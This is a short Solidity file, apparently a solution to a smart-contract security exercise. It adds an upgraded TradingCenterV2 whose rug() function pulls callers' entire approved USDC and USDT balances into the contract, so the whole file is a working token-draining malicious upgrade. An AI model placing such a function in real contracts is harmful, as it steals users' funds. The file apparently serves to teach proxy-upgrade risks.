// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import {TradingCenter} from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {
    constructor() {
        initialize(usdt, usdc);
    }

    function rug() external {
        usdc.transferFrom(msg.sender, address(this), usdc.balanceOf(msg.sender));
        usdt.transferFrom(msg.sender, address(this), usdt.balanceOf(msg.sender));
    }
}
